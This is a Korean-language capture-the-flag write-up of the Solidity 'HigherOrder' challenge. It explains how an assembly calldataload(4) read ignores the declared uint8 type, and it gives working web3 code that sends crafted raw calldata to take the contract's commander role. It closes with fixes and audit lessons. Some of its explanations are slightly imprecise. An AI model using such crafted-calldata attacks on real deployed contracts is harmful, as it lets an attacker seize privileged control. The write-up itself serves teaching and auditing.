# HigherOrder Challenge Writeup

## 문제 개요

-   **목표**: HigherOrder 컨트랙트의 Commander가 되기\
-   **난이도**: Medium\
-   **핵심 개념**: ABI 인코딩, 어셈블리, 함수 시그니처 vs 실제 구현,
    Solidity 버전별 차이점\
-   **Solidity 버전**: 0.6.12

## 컨트랙트 분석

### 전체 코드

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;
    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

### 함수별 분석

#### 1. registerTreasury(uint8)

-   시그니처: uint8 파라미터 (0-255 범위)\
-   실제 구현: 어셈블리로 `calldataload(4)` 사용\
-   문제점: 파라미터 타입과 실제 동작 불일치

#### 2. claimLeadership()

-   조건: `treasury > 255`\
-   결과: 조건 만족 시 `msg.sender`를 commander로 설정\
-   장벽: treasury 값이 255를 초과해야 함

------------------------------------------------------------------------

## 취약점 발견

핵심 취약점: **함수 시그니처 vs 어셈블리 구현**

``` solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

### 문제점

-   함수는 `uint8` 파라미터 선언 (0-255만 허용)
-   어셈블리는 `calldataload(4)`로 32바이트 전체 읽음
-   ABI 인코딩에서 `uint8`도 32바이트 패딩됨

------------------------------------------------------------------------

## ABI 인코딩 이해

`registerTreasury(256)` 호출시 calldata:

  위치   데이터        설명
  ------ ------------- ----------------------------
  0-3    211c85ab      함수 셀렉터
  4-35   0000...0100   uint8(256) → 32바이트 패딩

핵심: `calldataload(4)`는 4-35번째 위치의 모든 32바이트를 읽음!

------------------------------------------------------------------------

## 익스플로잇 개발

### 공격 시나리오

-   문제: treasury \> 255 필요, uint8은 최대 255\
-   취약점: 어셈블리가 실제로는 32바이트 읽음\
-   방법: 256 이상의 값을 raw calldata로 전송

### 함수 셀렉터 계산

``` javascript
const registerTreasurySelector = web3.utils.keccak256("registerTreasury(uint8)").slice(0, 10);
// 결과: 0x211c85ab
```

### 악의적인 Calldata 구성

``` javascript
const targetValue = "0000000000000000000000000000000000000000000000000000000000000100";
const maliciousCalldata = "0x211c85ab" + targetValue;
```

최종 calldata:

    0x211c85ab0000000000000000000000000000000000000000000000000000000000000100

------------------------------------------------------------------------

### 실행 과정

``` javascript
// 1단계: registerTreasury에 큰 값 전달
await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data: "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100",
    gas: 100000
});

// 2단계: treasury 값 확인
const treasury = await contract.treasury();
console.log(treasury.toString()); // "256"

// 3단계: commander 되기
await contract.claimLeadership();

// 4단계: 성공 확인
const commander = await contract.commander();
console.log(commander === player); // true
```

------------------------------------------------------------------------

## 공격 성공 원리

1.  Raw calldata 전송 → 함수 호출\
2.  어셈블리에서 `calldataload(4)` 실행\
3.  treasury 값이 256 저장됨\
4.  조건(`treasury > 255`) 만족\
5.  commander 권한 획득

------------------------------------------------------------------------

## 왜 이게 작동하는가?

``` solidity
// 이론상: uint8은 0-255만 가능
function registerTreasury(uint8 value) public {
    treasury = value;  // 256 불가능
}

// 실제: 어셈블리 직접 사용
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

------------------------------------------------------------------------

## 심화 분석

### Solidity 컴파일러 동작 (0.6.12)

-   함수 파라미터 타입 검증은 런타임이 아닌 컴파일 타임\
-   어셈블리 블록은 타입 시스템을 우회\
-   `calldataload`는 raw 데이터를 직접 읽음

### 다른 접근 방법

1.  **직접 calldata 전송** (성공)\
2.  **일반 함수 호출** (실패: ABI 인코더가 제한)

------------------------------------------------------------------------

## 방어 메커니즘

### 근본 원인

-   타입 시스템 우회\
-   시그니처와 구현 불일치\
-   입력 검증 부재

### 보안 개선 방안

1.  **타입 일관성 유지**

``` solidity
function registerTreasury(uint8 value) public {
    treasury = value;
}
```

2.  **명시적 범위 검증**

``` solidity
require(value <= 255, "Value too large");
```

3.  **안전한 어셈블리 사용**

``` solidity
assembly {
    let value := calldataload(4)
    if gt(value, 255) { revert(0, 0) }
    sstore(treasury_slot, value)
}
```

------------------------------------------------------------------------

## 교훈 및 시사점

### 개발자 관점

-   어셈블리 사용 주의
-   함수 시그니처와 구현의 일치성 유지
-   raw calldata 처리 시 입력 검증 필수

### 보안 감사 관점

-   어셈블리 코드 검토 필수
-   타입 범위 경계 테스트 필요
-   시그니처-구현 불일치 탐지

### Solidity 버전별 차이

-   **0.6.x**: 타입 검증 느슨
-   **0.8.x 이후**: 오버플로우/언더플로우 기본 방지 강화

------------------------------------------------------------------------

## 결론

이 문제는 **함수 시그니처와 실제 구현 간 불일치**를 악용한
취약점입니다.\
핵심 학습 포인트: - Solidity 타입 시스템 vs 어셈블리 관계\
- ABI 인코딩의 패딩 중요성\
- raw calldata 조작 가능성\
- 어셈블리 사용 시 보안 고려 필요
